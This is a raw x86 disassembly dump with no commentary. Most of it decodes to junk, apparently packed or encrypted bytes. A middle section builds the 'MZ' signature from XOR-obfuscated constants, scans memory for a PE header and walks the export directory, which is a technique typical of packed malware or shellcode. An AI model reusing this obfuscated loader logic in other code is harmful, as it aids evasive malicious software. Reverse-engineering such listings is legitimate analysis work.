  41dea4:	stc    
  41dea5:	outs   dx,DWORD PTR ds:[esi]
  41dea6:	hlt    
  41dea7:	test   BYTE PTR [ecx],ch
  41dea9:	and    eax,0xe65b1da7
  41deae:	(bad)  
  41deaf:	leave  
  41deb0:	mov    bl,0xcc
  41deb2:	cmp    eax,0xd86a5fe6
  41deb7:	sub    eax,0x27e17c35
  41debc:	ins    BYTE PTR es:[edi],dx
  41debd:	sub    al,0xdf
  41debf:	sbb    dl,BYTE PTR [ebp+0x7f31cbad]
  41dec5:	out    0xae,eax
  41dec7:	int3   
  41dec8:	iret   
  41dec9:	xor    edx,DWORD PTR [ecx]
  41decb:	neg    DWORD PTR [ecx]
  41decd:	mov    al,ds:0x10c1b940
  41ded2:	or     edi,DWORD PTR [ecx+0x3]
  41ded5:	fdiv   QWORD PTR ss:[ebx-0x33]
  41ded9:	sub    BYTE PTR es:[esi-0x66],al
  41dedd:	sti    
  41dede:	outs   dx,BYTE PTR ds:[esi]
  41dedf:	repnz mov ah,0x1d
  41dee2:	pop    ss
  41dee3:	pop    eax
  41dee5:	xor    DWORD PTR [edx-0x6f08ba58],esi
  41deeb:	mov    ds:0xf7bcdffc,eax
  41def0:	loopne 0x41de89
  41def2:	jle    0x41dee0
  41def4:	dec    ebx
  41def5:	mov    ?,WORD PTR [edi]
  41def7:	mov    dh,0xbf
  41def9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41defa:	push   edx
  41defb:	push   ebx
  41defc:	push   ebx
  41defd:	sbb    ebx,DWORD PTR [eax+0x69]
  41df00:	or     eax,0xb45a3b9
  41df05:	and    DWORD PTR [eax-0x65],ebx
  41df08:	mov    ebx,0x13b93cb6
  41df0d:	int    0x8d
  41df0f:	loopne 0x41dea8
  41df11:	not    BYTE PTR [edx+0x12152a9d]
  41df17:	pushf  
  41df18:	push   DWORD PTR [edi]
  41df1a:	test   DWORD PTR [ecx],eax
  41df1c:	loopne 0x41df38
  41df1e:	test   BYTE PTR [eax+0x1],dl
  41df21:	jl     0x41df13
  41df23:	dec    ebp
  41df24:	or     eax,0x9cf6b6e
  41df29:	inc    edi
  41df2a:	xchg   edx,eax
  41df2b:	mov    esp,0x6b914cc1
  41df30:	lock je 0x41deee
  41df33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df34:	adc    DWORD PTR [edi],ecx
  41df36:	xchg   ecx,eax
  41df37:	das    
  41df38:	int3   
  41df39:	xor    BYTE PTR [ecx],al
  41df3b:	pop    esp
  41df3c:	push   eax
  41df3d:	aad    0xf7
  41df3f:	mov    ch,0xb7
  41df41:	cmp    ecx,esi
  41df43:	pop    ss
  41df44:	fidivr WORD PTR ds:0x29a39a03
  41df4a:	mov    ah,0x93
  41df4c:	pop    ebp
  41df4d:	stos   BYTE PTR es:[edi],al
  41df4e:	ffree  st(6)
  41df50:	and    al,0x64
  41df52:	retf   
  41df53:	pop    ecx
  41df54:	sbb    al,0x3a
  41df56:	fdivr  QWORD PTR [ecx-0x2b71a7b6]
  41df5c:	xchg   ebx,eax
  41df5d:	cld    
  41df5e:	rcl    DWORD PTR ds:0x1f03bf77,0xc8
  41df65:	jb     0x41df5d
  41df67:	xchg   ebx,eax
  41df68:	jmp    0xc441:0x59ab820
  41df6f:	mov    DWORD PTR [ebp+0x763e67a6],edi
  41df75:	pop    eax
  41df76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df77:	jne    0x41dfe4
  41df79:	sbb    DWORD PTR [esp+edx*4],ecx
  41df7c:	out    dx,al
  41df7d:	jae    0x41df81
  41df7f:	(bad)  
  41df80:	cmc    
  41df81:	out    dx,al
  41df82:	and    DWORD PTR [edi+0x3e],eax
  41df85:	jnp    0x41dfcb
  41df87:	jmp    0x26c5d8a4
  41df8c:	fld    DWORD PTR [edi+ecx*1+0x5e1b4aff]
  41df93:	mov    al,0x3e
  41df95:	mov    bl,0xae
  41df97:	or     ecx,ebp
  41df99:	pushf  
  41df9a:	repnz mov esi,DWORD PTR [esi]
  41df9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df9e:	out    dx,eax
  41df9f:	xchg   DWORD PTR [ebp+ebp*8-0x2e454fe3],edi
  41dfa6:	div    DWORD PTR gs:[edx+0x2d4809b6]
  41dfad:	or     eax,0x7265e84a
  41dfb2:	push   edi
  41dfb3:	pop    ss
  41dfb4:	retf   0xc05c
  41dfb7:	push   cs
  41dfb8:	dec    ebp
  41dfb9:	sub    eax,0x93c3cd7a
  41dfbe:	scas   al,BYTE PTR es:[edi]
  41dfbf:	out    dx,al
  41dfc0:	cdq    
  41dfc1:	xchg   ebp,eax
  41dfc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc3:	mov    edx,0xbb0610e5
  41dfc8:	nop    DWORD PTR [edi-0x4c7791aa]
  41dfcf:	xchg   ecx,eax
  41dfd0:	sbb    cl,BYTE PTR [edi+0x3]
  41dfd3:	icebp  
  41dfd4:	mov    esp,fs
  41dfd6:	popa   
  41dfd7:	jbe    0x41dfdb
  41dfd9:	in     eax,dx
  41dfda:	fs repz pop ecx
  41dfdd:	sbb    bl,BYTE PTR [edi-0x3e4a9218]
  41dfe3:	stos   DWORD PTR es:[edi],eax
  41dfe4:	push   esp
  41dfe5:	repz or eax,ebx
  41dfe8:	mov    edi,0xa93045c5
  41dfed:	popa   
  41dfee:	ins    BYTE PTR es:[edi],dx
  41dfef:	jl     0x41dff3
  41dff1:	inc    edx
  41dff2:	and    dh,BYTE PTR [edi-0x4f]
  41dff5:	and    al,0x8c
  41dff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dff8:	inc    esi
  41dff9:	(bad)  
  41dffb:	call   0x1757:0x699788a5
  41e002:	lds    esp,FWORD PTR [ebp-0x6d]
  41e005:	bound  ecx,QWORD PTR [ebx]
  41e007:	sub    DWORD PTR [edi-0x4e],ebx
  41e00a:	je     0x41dfd1
  41e00c:	js     0x41dfcb
  41e00e:	ret    0x1018
  41e011:	jae    0x41e02e
  41e013:	cmp    al,BYTE PTR [esi]
  41e015:	mov    ebp,0x8250a20d
  41e01a:	mov    dh,0xf4
  41e01c:	or     DWORD PTR [eax],esi
  41e01e:	jle    0x41dfcc
  41e020:	scas   al,BYTE PTR es:[edi]
  41e021:	test   BYTE PTR [esi+0x56f5f209],dh
  41e027:	mov    ch,0x55
  41e029:	ss sti 
  41e02b:	(bad)  
  41e02c:	in     eax,0xc6
  41e02e:	adc    DWORD PTR [eax+0x20],ebx
  41e031:	sub    ah,BYTE PTR [esi+0x14]
  41e034:	lds    ecx,FWORD PTR [esi+eax*4-0x4cdf3705]
  41e03b:	jle    0x41e075
  41e03d:	in     eax,dx
  41e03e:	inc    eax
  41e03f:	outs   dx,DWORD PTR ds:[esi]
  41e040:	or     BYTE PTR [ebx+edi*4-0x507524b4],cl
  41e047:	and    edx,DWORD PTR [esi]
  41e049:	fsub   QWORD PTR [edx-0x37]
  41e04c:	dec    esp
  41e04d:	jl     0x41e071
  41e04f:	jbe    0x41dff9
  41e051:	fnstsw WORD PTR [edi-0x29]
  41e054:	loopne 0x41e064
  41e056:	or     DWORD PTR ds:0xda55a7eb,esp
  41e05c:	mov    bh,0xc4
  41e05e:	ins    DWORD PTR es:[edi],dx
  41e05f:	jno    0x41e078
  41e061:	nop
  41e062:	sbb    BYTE PTR [eax-0x5d1ec97e],dl
  41e068:	pop    eax
  41e069:	popf   
  41e06a:	sbb    bh,0x48
  41e06d:	in     al,dx
  41e06e:	je     0x41e0db
  41e070:	mov    dl,0x4f
  41e072:	push   0xffffffc5
  41e074:	je     0x41e0f5
  41e076:	pop    ss
  41e077:	(bad)  
  41e079:	jb     0x41e004
  41e07b:	jmp    0xa3b7a1a1
  41e080:	mov    edx,0x8711a49d
  41e085:	sub    BYTE PTR [ebp-0x67],cl
  41e088:	push   0xffffffc2
  41e08a:	sbb    DWORD PTR [edx+0x4b],ebp
  41e08d:	aaa    
  41e08e:	aad    0x6d
  41e090:	rcl    ah,cl
  41e092:	nop
  41e093:	or     eax,0x5673b505
  41e098:	jbe    0x41e04d
  41e09a:	add    bl,dh
  41e09c:	hlt    
  41e09d:	lea    eax,[edx]
  41e09f:	imul   BYTE PTR [eax-0x2b9d7e35]
  41e0a5:	dec    ebp
  41e0a6:	sbb    DWORD PTR [ebx-0xb9a9d0e],ecx
  41e0ac:	mov    esp,0x3250898c
  41e0b1:	call   0x377048db
  41e0b6:	push   ecx
  41e0b7:	mov    ds:0x913dec4e,eax
  41e0bc:	pop    ds
  41e0bd:	xchg   esp,eax
  41e0be:	jo     0x41e087
  41e0c0:	add    eax,0x428e3f
  41e0c5:	push   esp
  41e0c6:	adc    eax,DWORD PTR [eax]
  41e0c8:	add    BYTE PTR [edi],cl
  41e0ca:	test   DWORD PTR [ecx],esi
  41e0cc:	add    BYTE PTR [eax],al
  41e0ce:	add    BYTE PTR [ebx],bh
  41e0d0:	xrelease mov DWORD PTR ds:0x428e7b,0x261b
  41e0db:	jne    0x41e100
  41e0e1:	push   ebx
  41e0e2:	mov    DWORD PTR ds:0x428e67,0x2b68
  41e0ec:	push   0x70941f97
  41e0f1:	mov    DWORD PTR ds:0x428e63,0x40d9
  41e0fb:	jmp    0x420786
  41e100:	mov    eax,ds:0x428eb7
  41e105:	mov    eax,DWORD PTR [ebp+0x18]
  41e108:	mov    esi,DWORD PTR [ebp+0x1c]
  41e10b:	cmp    eax,0x70941f97
  41e110:	mov    DWORD PTR ds:0x428ebb,0x3db6
  41e11a:	jne    0x41e147
  41e120:	cmp    esi,ebx
  41e122:	mov    DWORD PTR ds:0x428e5f,0x2bd8
  41e12c:	jne    0x41e147
  41e132:	push   ebx
  41e133:	mov    DWORD PTR ds:0x428e2b,0x15b3
  41e13d:	push   0x70941f95
  41e142:	jmp    0x420786
  41e147:	mov    DWORD PTR ds:0x428e73,0x7017
  41e151:	mov    eax,DWORD PTR [ebp+0x18]
  41e154:	mov    esi,DWORD PTR [ebp+0x1c]
  41e157:	mov    DWORD PTR ds:0x428e27,0x78f9
  41e161:	cmp    eax,0x70941f95
  41e166:	jne    0x41e19d
  41e16c:	mov    DWORD PTR ds:0x428ecf,0x6494
  41e176:	cmp    esi,ebx
  41e178:	jne    0x41e19d
  41e17e:	push   ebx
  41e17f:	mov    DWORD PTR ds:0x428ea3,0x58e0
  41e189:	push   0x70941f9b
  41e18e:	mov    DWORD PTR ds:0x428e3f,0x40d6
  41e198:	jmp    0x420786
  41e19d:	mov    DWORD PTR ds:0x428e93,edx
  41e1a3:	mov    eax,DWORD PTR [ebp+0x18]
  41e1a6:	mov    esi,DWORD PTR [ebp+0x1c]
  41e1a9:	mov    DWORD PTR ds:0x428e83,0x6338
  41e1b3:	cmp    eax,0x70941f9b
  41e1b8:	mov    DWORD PTR ds:0x428e53,0x174c
  41e1c2:	jne    0x41e203
  41e1c8:	mov    DWORD PTR ds:0x428e67,0x61b3
  41e1d2:	cmp    esi,ebx
  41e1d4:	mov    DWORD PTR ds:0x428e4b,0x6bb8
  41e1de:	jne    0x41e203
  41e1e4:	mov    DWORD PTR ds:0x428e2b,0x777c
  41e1ee:	push   ebx
  41e1ef:	push   0x70941f99
  41e1f4:	mov    DWORD PTR ds:0x428eb7,0x6b5e
  41e1fe:	jmp    0x420786
  41e203:	mov    eax,DWORD PTR [ebp+0x18]
  41e206:	not    edi
  41e208:	mov    esi,DWORD PTR [ebp+0x1c]
  41e20b:	mov    edi,0x70941f9d
  41e210:	cmp    eax,edi
  41e212:	jne    0x420747
  41e218:	cmp    esi,ebx
  41e21a:	jne    0x420747
  41e220:	mov    eax,DWORD PTR [ebp+0x10]
  41e223:	xor    eax,ecx
  41e225:	add    eax,edx
  41e227:	mov    DWORD PTR [ebp-0x20],eax
  41e22a:	mov    eax,DWORD PTR [ebp+0xc]
  41e22d:	mov    esi,DWORD PTR [ebp-0x8]
  41e230:	xor    eax,ecx
  41e232:	add    eax,edx
  41e234:	imul   eax,DWORD PTR [esi]
  41e237:	mov    esi,DWORD PTR [ebp+0x8]
  41e23a:	xor    esi,ecx
  41e23c:	add    esi,edx
  41e23e:	cmp    esi,eax
  41e240:	mov    eax,DWORD PTR [ebp-0x4]
  41e243:	mov    edi,0xffcd8d0a
  41e248:	je     0x41e267
  41e24e:	mov    esi,DWORD PTR [ebp-0x20]
  41e251:	add    DWORD PTR [eax],esi
  41e253:	mov    eax,DWORD PTR [ebp-0x4]
  41e256:	mov    esi,DWORD PTR [ebp+0xc]
  41e259:	xor    esi,ecx
  41e25b:	add    esi,edx
  41e25d:	imul   esi,DWORD PTR [eax]
  41e260:	mov    DWORD PTR [eax],esi
  41e262:	jmp    0x41e26c
  41e267:	mov    esi,DWORD PTR [ebp+0x14]
  41e26a:	xor    DWORD PTR [eax],esi
  41e26c:	mov    eax,DWORD PTR [ebp-0x4]
  41e26f:	mov    esi,DWORD PTR [ebp+0x10]
  41e272:	xor    esi,ecx
  41e274:	sub    edi,esi
  41e276:	add    DWORD PTR [eax],edi
  41e278:	mov    eax,DWORD PTR [ebp-0x4]
  41e27b:	mov    esi,DWORD PTR [ebp-0x8]
  41e27e:	add    esi,DWORD PTR [eax]
  41e280:	mov    DWORD PTR [ebp-0x8],esi
  41e283:	mov    eax,DWORD PTR [ebp+0xc]
  41e286:	mov    esi,DWORD PTR [ebp+0xc]
  41e289:	xor    esi,ecx
  41e28b:	xor    eax,ecx
  41e28d:	lea    eax,[eax+esi*1+0x64e5ec]
  41e294:	mov    esi,DWORD PTR [ebp+0xc]
  41e297:	xor    esi,ecx
  41e299:	add    esi,edx
  41e29b:	imul   eax,esi
  41e29e:	mov    esi,DWORD PTR [ebp+0xc]
  41e2a1:	xor    esi,ecx
  41e2a3:	sub    esi,eax
  41e2a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e2a8:	add    esi,edx
  41e2aa:	cmp    DWORD PTR [eax],esi
  41e2ac:	mov    eax,DWORD PTR [ebp-0x4]
  41e2af:	mov    esi,DWORD PTR [ebp+0x10]
  41e2b2:	jg     0x41e2c8
  41e2b8:	xor    esi,ecx
  41e2ba:	mov    edi,0xffcd8d0a
  41e2bf:	sub    edi,esi
  41e2c1:	add    DWORD PTR [eax],edi
  41e2c3:	jmp    0x41e2ce
  41e2c8:	xor    esi,ecx
  41e2ca:	add    esi,edx
  41e2cc:	add    DWORD PTR [eax],esi
  41e2ce:	mov    eax,DWORD PTR [ebp-0x8]
  41e2d1:	mov    esi,DWORD PTR [ebp-0x10]
  41e2d4:	mov    eax,DWORD PTR [eax]
  41e2d6:	xor    esi,ecx
  41e2d8:	add    esi,0x3272f5
  41e2de:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e2e5:	mov    DWORD PTR [ebp-0x24],ebx
  41e2e8:	not    esi
  41e2ea:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e2f1:	mov    DWORD PTR [ebp-0x2c],ebx
  41e2f4:	mov    ebx,DWORD PTR [ebp-0x28]
  41e2f7:	mov    edi,DWORD PTR [ebp-0x24]
  41e2fa:	and    eax,esi
  41e2fc:	mov    esi,0xa143
  41e301:	xor    bx,si
  41e304:	mov    esi,0x412e
  41e309:	add    bx,si
  41e30c:	cmp    WORD PTR [eax],bx
  41e30f:	je     0x41e359
  41e315:	mov    edi,DWORD PTR [ebp-0x10]
  41e318:	xor    edi,ecx
  41e31a:	mov    DWORD PTR [ebp-0x28],0x7097b85c
  41e321:	mov    DWORD PTR [ebp-0x24],0xffffffff
  41e328:	mov    ebx,0xffcd8d0a
  41e32d:	sub    ebx,edi
  41e32f:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  41e336:	add    eax,ebx
  41e338:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  41e33f:	mov    edi,DWORD PTR [ebp-0x28]
  41e342:	mov    ebx,DWORD PTR [ebp-0x24]
  41e345:	mov    ebx,0xa143
  41e34a:	xor    di,bx
  41e34d:	add    di,si
  41e350:	cmp    WORD PTR [eax],di
  41e353:	jne    0x41e315
  41e359:	mov    edi,DWORD PTR [ebp-0x14]
  41e35c:	mov    edi,DWORD PTR [edi]
  41e35e:	mov    ebx,DWORD PTR [eax+0x3c]
  41e361:	lea    edi,[ebx+edi*8+0x78]
  41e365:	mov    edi,DWORD PTR [edi+eax*1]
  41e368:	mov    DWORD PTR [ebp-0x18],edi
  41e36b:	mov    edi,DWORD PTR [ebp+0x8]
  41e36e:	xor    edi,ecx
  41e370:	add    edi,edx
  41e372:	jmp    0x4206eb
  41e377:	push   esi
  41e378:	inc    eax
  41e379:	dec    ebp
  41e37a:	test   DWORD PTR ds:0xe2b09684,eax
  41e380:	(bad)  [ebx]
  41e382:	data16 fsubr DWORD PTR [edx-0x2534581d]
  41e389:	add    BYTE PTR [ebx-0x7c7c9fd9],0x19
  41e390:	sub    BYTE PTR [edx-0xc96f79b],dl
  41e396:	(bad)  
  41e398:	jmp    0xd32b:0xc1f9e781
  41e39f:	inc    ebx
  41e3a0:	xchg   BYTE PTR [esi],bl
  41e3a2:	sub    eax,DWORD PTR [ecx]
  41e3a4:	add    eax,0x56ddf562
  41e3a9:	cld    
  41e3aa:	xor    ch,bh
  41e3ac:	rcr    DWORD PTR [eax+0x49dcca3],cl
  41e3b2:	ret    
  41e3b3:	or     al,BYTE PTR [eax-0x613b45c9]
  41e3b9:	push   edx
  41e3ba:	push   ss
  41e3bb:	enter  0x2b3c,0x3a
  41e3bf:	pop    ds
  41e3c0:	xchg   esi,eax
  41e3c1:	push   edx
  41e3c2:	popa   
  41e3c3:	inc    ecx
  41e3c4:	jno    0x41e3d0
  41e3c6:	and    eax,0x918ad418
  41e3cb:	jmp    0x41e3b0
  41e3cd:	sbb    eax,0x76ed3459
  41e3d2:	jns    0x41e3ac
  41e3d4:	arpl   WORD PTR [esi-0x7c80fca8],sp
  41e3da:	xchg   ah,bl
  41e3dc:	ffreep st(4)
  41e3de:	sub    BYTE PTR [eax+esi*4-0x5e],cl
  41e3e2:	stos   BYTE PTR es:[edi],al
  41e3e3:	and    bh,al
  41e3e5:	and    ch,BYTE PTR [edx+eax*8]
  41e3e8:	push   ds
  41e3e9:	daa    
  41e3ea:	neg    DWORD PTR [ebp-0x1d83ca2c]
  41e3f0:	cli    
  41e3f1:	jge    0x41e446
  41e3f3:	rcl    DWORD PTR [ebx+0x42],cl
  41e3f6:	or     DWORD PTR [esi+0x2742ff8a],0xffffffcc
  41e3fd:	jl     0x41e415
  41e3ff:	test   al,0x6b
  41e401:	ffreep st(7)
  41e403:	icebp  
  41e404:	or     eax,0x19b08813
  41e409:	arpl   WORD PTR [edi+0x5f56cb3a],cx
  41e40f:	and    eax,edx
  41e411:	scas   eax,DWORD PTR es:[edi]
  41e412:	or     edx,ecx
  41e414:	nop
  41e415:	and    DWORD PTR [eax-0x1b028e56],esp
  41e41b:	inc    eax
  41e41c:	mov    dh,0xc
  41e41e:	mov    ch,0xd3
  41e420:	icebp  
  41e421:	in     eax,0xf5
  41e423:	and    BYTE PTR [ecx],bl
  41e425:	out    0x9e,al
  41e427:	jo     0x41e4a5
  41e429:	mov    al,0x2b
  41e42b:	das    
  41e42c:	push   ds
  41e42d:	add    BYTE PTR [eax+0x2ee1d743],cl
  41e433:	mov    ecx,DWORD PTR ds:0x84bc8941
  41e439:	dec    esp
  41e43a:	or     eax,0xd041cd66
  41e43f:	aam    0x8a
  41e441:	xchg   DWORD PTR [ecx],ebx
  41e443:	fstp   QWORD PTR [edx+0x2a2cdbf0]
  41e449:	jae    0x41e4a4
  41e44b:	mov    ebp,0x9aae2268
  41e450:	or     eax,0xe68bcc57
  41e455:	push   cs
  41e456:	sar    DWORD PTR [ecx+0x60d344a0],0xca
  41e45d:	pop    ebx
  41e45e:	dec    ebx
  41e45f:	sahf   
  41e460:	test   cl,dl
  41e462:	xchg   BYTE PTR [ecx+ecx*8+0x2f3af233],ah
  41e469:	into   
  41e46a:	jns    0x41e490
  41e46c:	xchg   edi,eax
  41e46d:	ins    DWORD PTR es:[edi],dx
  41e46e:	xor    edi,DWORD PTR [edi]
  41e470:	xor    BYTE PTR [edi-0x7a186a30],al
  41e476:	jcxz   0x41e426
  41e479:	(bad)
  41e47e:	out    dx,eax
  41e47f:	dec    ebp
  41e480:	mov    esi,DWORD PTR [ecx+ebp*4]
  41e483:	es mov esp,0xe39774a6
  41e489:	bound  esi,QWORD PTR [ebp-0x76721582]
  41e48f:	ficom  WORD PTR [edi+ebx*1]
  41e492:	mov    bh,0xb1
  41e494:	jl     0x41e476
  41e496:	jmp    DWORD PTR [ebx-0xf]
  41e499:	ins    BYTE PTR es:[edi],dx
  41e49a:	lock mov dl,0x4b
  41e49d:	jmp    0x514f:0xb52519c8
  41e4a4:	xchg   esi,eax
  41e4a5:	xor    ah,BYTE PTR [eax-0x14cbfa14]
  41e4ab:	jmp    0x41e438
  41e4ad:	(bad)  
  41e4ae:	rol    DWORD PTR [ecx-0x205de3e3],1
  41e4b4:	nop
  41e4b5:	das    
  41e4b6:	mov    ecx,0x31d2d945
  41e4bb:	pop    ebp
  41e4bc:	addr16 je 0x41e486
  41e4bf:	mov    cl,cl
  41e4c1:	ds in  al,dx
  41e4c3:	push   esi
  41e4c4:	mov    eax,edx
  41e4c6:	cmp    edi,ecx
  41e4c8:	stos   BYTE PTR es:[edi],al
  41e4c9:	shl    DWORD PTR [ebp+0x6a1df323],cl
  41e4cf:	test   dh,bh
  41e4d1:	aas    
  41e4d2:	mov    eax,0x1ff397f1
  41e4d7:	repz push edx
  41e4d9:	xor    al,0x96
  41e4db:	out    dx,eax
  41e4dc:	xlat   BYTE PTR ds:[ebx]
  41e4dd:	sbb    ch,bl
  41e4df:	je     0x41e4dc
  41e4e1:	loopne 0x41e506
  41e4e3:	dec    ebx
  41e4e4:	fwait
  41e4e5:	or     DWORD PTR [ebx+0x3d822f5c],esi
  41e4eb:	mov    edi,0x8fe06274
  41e4f0:	mov    ecx,0xaa9e05a8
  41e4f5:	shl    DWORD PTR [ebx+0x4feedaab],cl
  41e4fb:	adc    DWORD PTR [ecx+0x11c8f913],ebx
  41e501:	into   
  41e502:	xor    eax,0xb5a80f2
  41e507:	test   DWORD PTR [esi],esi
  41e509:	sub    ebx,DWORD PTR [edi+0x4e]
  41e50c:	sahf   
  41e50d:	inc    esp
  41e50e:	cmp    eax,0x41304439
  41e513:	inc    edx
  41e514:	leave  
  41e515:	push   ds
  41e516:	ds into 
  41e518:	repnz scas eax,DWORD PTR es:[edi]
  41e51a:	add    BYTE PTR [eax-0x1bb84e4d],dl
  41e520:	sbb    eax,0xf1215e28
  41e525:	and    DWORD PTR [edi],0x4affb19b
  41e52b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e52c:	mov    ds:0x2c817212,al
  41e531:	pop    edi
  41e532:	cmp    al,0x3
  41e534:	ins    DWORD PTR es:[edi],dx
  41e535:	dec    esp
  41e536:	sbb    DWORD PTR [edi*8+0x355476b7],ebp
  41e53d:	adc    BYTE PTR [edi-0x1eac1585],ah
  41e543:	jl     0x41e576
  41e545:	ss mov edi,0xa75b56a1
  41e54b:	cmp    BYTE PTR [ebp+0x420587c],al
  41e551:	pop    esp
  41e552:	(bad)  
  41e553:	aam    0xcb
  41e555:	lock xchg edi,eax
  41e557:	and    DWORD PTR [ecx+eax*4],edi
  41e55a:	idiv   dh
  41e55c:	lods   al,BYTE PTR ds:[esi]
  41e55d:	push   eax
  41e55e:	pusha  
  41e55f:	jp     0x41e584
  41e561:	idiv   esp
  41e563:	push   esi
  41e564:	add    BYTE PTR [esi+0x439e16d1],bh
  41e56a:	int3   
  41e56b:	out    0x35,eax
  41e56d:	cld    
  41e56e:	adc    ebx,0x3e20f2ab
  41e574:	cmp    eax,0x9c2b13dd
  41e579:	aaa    
  41e57a:	sbb    BYTE PTR [ebp-0x6f112296],dl
  41e580:	mov    ebx,0x37c706db
  41e585:	cmc    
  41e586:	lahf   
  41e587:	adc    DWORD PTR [eax],esp
  41e589:	pop    edx
  41e58a:	jmp    0x41e578
  41e58c:	int3   
  41e58d:	ret    
  41e58e:	sub    al,0x91
  41e590:	(bad)  
  41e591:	push   0x71bce0d9
  41e596:	lds    esi,FWORD PTR [edx+0x65]
  41e599:	call   0x6ef791bf
  41e59e:	push   0xffffffe4
  41e5a0:	cwde   
  41e5a1:	ja     0x41e586
  41e5a3:	add    DWORD PTR [esi-0x20],esp
  41e5a6:	leave  
  41e5a7:	loope  0x41e56e
  41e5a9:	iret   
  41e5aa:	and    al,0xcc
  41e5ac:	and    al,0xec
  41e5ae:	jb     0x41e5b7
  41e5b0:	call   0x44641d8
  41e5b5:	sbb    ebx,esp
  41e5b7:	adc    ch,bh
  41e5b9:	jle    0x41e5a3
  41e5bb:	addr16 jne 0x41e621
  41e5be:	mov    al,0x99
  41e5c0:	es ds add al,0xea
  41e5c4:	jo     0x41e592
  41e5c6:	xchg   ebp,eax
  41e5c7:	ffreep st(2)
  41e5c9:	xchg   DWORD PTR [eax+0xa97ba5d],ebp
  41e5cf:	gs push dx
  41e5d2:	imul   ecx,DWORD PTR [edx],0x5b940aae
  41e5d8:	adc    al,0x83
  41e5da:	or     ebp,0x90488c84
  41e5e0:	jae    0x41e5c5
  41e5e2:	sub    al,0xbc
  41e5e4:	mov    ah,0x8c
  41e5e6:	or     dl,BYTE PTR [edx+0x7bafd52e]
  41e5ec:	jo     0x41e604
  41e5ee:	(bad)  
  41e5ef:	call   FWORD PTR ds:0x688118f3
  41e5f5:	test   bh,dh
  41e5f7:	push   esi
  41e5f8:	test   BYTE PTR [eax-0x13],0x76
  41e5fc:	pop    ds
  41e5fd:	pop    edi
  41e5fe:	pop    eax
  41e5ff:	push   0xffffffba
  41e601:	push   edi
  41e602:	mov    DWORD PTR ds:[edi+0x7b8780d2],0x7083fec9
  41e60d:	iret   
  41e60e:	push   ebp
  41e60f:	push   ebp
  41e610:	jne    0x41e62a
  41e612:	fcom   QWORD PTR [ebp+0x37f64b6e]
  41e618:	and    esp,DWORD PTR [edx-0x31]
  41e61b:	iret   
  41e61c:	shl    dh,0xb4
  41e61f:	jo     0x41e5b3
  41e621:	cmp    bl,BYTE PTR ds:0xa93f8c50
  41e627:	mov    cs,WORD PTR [edi+ebx*2+0x2cb7d0ea]
  41e62e:	int    0x56
  41e630:	cmc    
  41e631:	pushf  
  41e632:	and    BYTE PTR [ebp+0x715d879d],dl
  41e638:	out    0x21,al
  41e63a:	sub    al,0x2a
  41e63c:	jmp    0x41ed:0x408269e6
  41e643:	(bad)  
  41e644:	(bad)  
  41e645:	cld    
  41e646:	aaa    
  41e647:	rol    esp,cl
  41e649:	into   
  41e64a:	mov    al,0xb7
  41e64c:	inc    esp
  41e64d:	sbb    ah,BYTE PTR [edx+0x5e]
  41e650:	jg     0x41e6a9
  41e652:	sub    al,0x72
  41e654:	test   bx,dx
  41e657:	and    ebp,esi
  41e659:	dec    esp
  41e65a:	stc    
  41e65b:	pop    es
  41e65c:	push   ss
  41e65d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e65e:	mov    edx,0x2f2857a6
  41e663:	inc    edi
  41e664:	shr    BYTE PTR [edi-0x6b],0x81
  41e668:	xchg   esi,eax
  41e669:	cdq    
  41e66a:	outs   dx,BYTE PTR ds:[esi]
  41e66b:	jnp    0x41e656
  41e66d:	inc    ebx
  41e66e:	lock out dx,eax
  41e670:	in     eax,0x59
  41e672:	inc    esi
  41e673:	inc    eax
  41e674:	xlat   BYTE PTR ds:[ebx]
  41e675:	sbb    ebx,DWORD PTR [ebp-0x1e]
  41e678:	retf   0x7c31
  41e67b:	(bad)  
  41e67c:	xchg   ebp,eax
  41e67d:	addr16 cmp esi,esp
  41e680:	js     0x41e68a
  41e682:	cmc    
  41e683:	gs in  al,0x5
  41e686:	int3   
  41e687:	jbe    0x41e635
  41e689:	mov    WORD PTR [esi-0x7f],ss
  41e68c:	dec    eax
  41e68d:	lahf   
  41e68e:	rcr    edi,cl
  41e690:	lock mov edx,0x63222b6
  41e696:	jg     0x41e64d
  41e698:	repz mov al,0xc6
  41e69b:	lahf   
  41e69c:	adc    ebp,eax
  41e69e:	xor    esi,DWORD PTR [eax-0x65d9a32a]
  41e6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6a5:	ja     0x41e630
  41e6a7:	in     eax,dx
  41e6a8:	stos   BYTE PTR es:[edi],al
  41e6a9:	mov    al,cs:0x336cacbc
  41e6af:	push   edx
  41e6b0:	(bad)  
  41e6b1:	cmp    dh,al
  41e6b3:	mov    edi,0x9bccaf22
  41e6b8:	xchg   edi,eax
  41e6b9:	iret   
  41e6ba:	loop   0x41e671
  41e6bc:	or     esi,DWORD PTR [eax-0x2d9bda0e]
  41e6c2:	std    
  41e6c3:	or     eax,0x807fdee0
  41e6c8:	push   cs
  41e6c9:	mov    edx,0xcf1b503c
  41e6ce:	int    0xa
  41e6d0:	retf   
  41e6d1:	fistp  DWORD PTR [eax+0x352fff56]
  41e6d7:	jp     0x41e70e
  41e6d9:	dec    ebx
  41e6da:	repnz mov edi,0x24d72d6f
  41e6e0:	jbe    0x41e6b7
  41e6e2:	ja     0x41e6e7
  41e6e4:	nop
  41e6e5:	adc    eax,0xb2e2dd86
  41e6ea:	add    BYTE PTR [edi-0x7c],dh
  41e6ed:	(bad)  
  41e6ee:	shr    bl,1
  41e6f0:	add    eax,DWORD PTR [edi-0x35dfe326]
  41e6f6:	scas   eax,DWORD PTR es:[di]
  41e6f8:	clc    
  41e6f9:	dec    edi
  41e6fa:	outs   dx,DWORD PTR ds:[esi]
  41e6fb:	int    0xdd
  41e6fd:	add    DWORD PTR [esp+ebx*4],0x6d
